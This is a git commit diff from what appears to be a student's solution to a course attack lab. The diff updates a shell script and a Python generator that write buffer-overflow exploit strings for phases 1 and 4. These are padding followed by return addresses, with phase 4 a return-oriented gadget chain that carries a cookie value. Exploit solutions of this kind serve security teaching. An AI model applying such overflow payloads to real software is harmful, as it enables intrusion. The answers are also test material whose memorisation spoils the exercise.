d8fa1c010106f78f406b510490b3911ee7600812
kaleid-liner <noob@mail.ustc.edu.cn>
2019-03-27 00:56:24 +0800

    touch4: the only i pass at the first go :)

--- attack/generate.sh
+++ attack/generate.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-python touch.py 1
+python3 touch.py 1
 ./hex2raw -i touch1.txt > touch1
 
 gcc -c touch2.s 
@@ -7,3 +7,6 @@ objcopy touch2.o -O binary touch2
 
 gcc -c touch3.s
 objcopy touch3.o -O binary touch3
+
+python3 touch.py 4
+./hex2raw -i touch4.txt > touch4
--- attack/touch.py
+++ attack/touch.py
@@ -1,9 +1,17 @@
 import sys
 
-with open('touch1.txt', 'w') as out:
+phase = int(sys.argv[1])
+
+with open(f'touch{ phase }.txt', 'w') as out:
     out.write('00 ' * 40)
-    phase = int(sys.argv[1])
     
     if phase == 1:
         out.write('C0 17 40 ' + '00 ' * 7 + '\n')
+
+    if phase == 4:
+        out.write('AB 19 40 00 ' + '00 ' * 4
+                + 'FA 97 B9 59 ' + '00 ' * 4
+                + 'A2 19 40 00 ' + '00 ' * 4
+                + 'EC 17 40 00 ' + '00 ' * 4 + '\n');
+
 
